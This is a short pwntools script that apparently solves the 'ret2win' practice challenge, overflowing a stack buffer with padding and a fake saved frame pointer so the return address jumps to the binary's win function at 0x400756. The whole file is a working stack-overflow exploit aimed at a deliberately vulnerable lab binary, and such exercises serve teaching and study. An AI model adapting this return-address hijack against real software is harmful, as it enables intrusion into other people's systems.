from pwn import *
sh = process("./ret2win")

# address
ret_addr = p64(0x0000000000400756)   # ret2win
deadbeef = p64(0xdeadbeef)

#payload
payload = b'a'*32 + deadbeef + ret_addr

sh.sendline(payload)
sh.interactive()
